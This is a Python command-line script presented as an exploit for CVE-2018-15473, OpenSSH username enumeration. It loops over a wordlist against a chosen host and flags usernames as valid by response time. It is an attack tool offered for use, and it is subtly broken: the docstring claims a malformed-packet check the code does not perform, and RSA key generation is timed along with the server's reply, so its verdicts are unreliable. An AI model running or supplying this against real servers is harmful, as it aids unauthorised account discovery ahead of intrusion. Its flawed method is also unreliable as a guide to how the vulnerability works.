#!/usr/bin/env python3
"""
CVE-2018-15473 - OpenSSH < 7.7 Username Enumeration
Simplified implementation using timing/response analysis
"""
import paramiko
import socket
import time
import sys

class SSHUserEnum:
    def __init__(self, host, port=22, timeout=5):
        self.host = host
        self.port = port
        self.timeout = timeout
        
    def check_user(self, username):
        """Check if username exists via malformed packet response"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(self.timeout)
        
        try:
            sock.connect((self.host, self.port))
            transport = paramiko.Transport(sock)
            transport.connect()
            
            start = time.time()
            try:
                transport.auth_publickey(username, paramiko.RSAKey.generate(2048))
            except paramiko.AuthenticationException as e:
                elapsed = time.time() - start
                # Valid users often have different response times
                return username, elapsed, str(e)
            except Exception as e:
                elapsed = time.time() - start
                return username, elapsed, str(e)
            finally:
                transport.close()
        except Exception as e:
            return username, 0, f"Connection error: {e}"
        finally:
            sock.close()
            
        return username, 0, "Unknown"

def main():
    if len(sys.argv) < 4:
        print(f"Usage: {sys.argv[0]} <host> <port> <userlist>")
        sys.exit(1)
        
    host = sys.argv[1]
    port = int(sys.argv[2])
    userlist = sys.argv[3]
    
    print(f"[*] Target: {host}:{port}")
    print(f"[*] CVE-2018-15473 Username Enumeration\n")
    
    enumerator = SSHUserEnum(host, port)
    results = []
    
    with open(userlist, 'r') as f:
        users = [line.strip() for line in f if line.strip()]
    
    for user in users:
        username, elapsed, response = enumerator.check_user(user)
        results.append((username, elapsed, response))
        status = "VALID" if elapsed > 0.5 else "INVALID/UNKNOWN"
        print(f"[{'+'if elapsed > 0.5 else '-'}] {username}: {elapsed:.3f}s - {status}")
        time.sleep(0.5)  # Rate limiting
    
    print("\n[*] Results Summary:")
    print("-" * 50)
    sorted_results = sorted(results, key=lambda x: x[1], reverse=True)
    for user, elapsed, _ in sorted_results[:10]:
        print(f"    {user}: {elapsed:.3f}s")

if __name__ == "__main__":
    main()
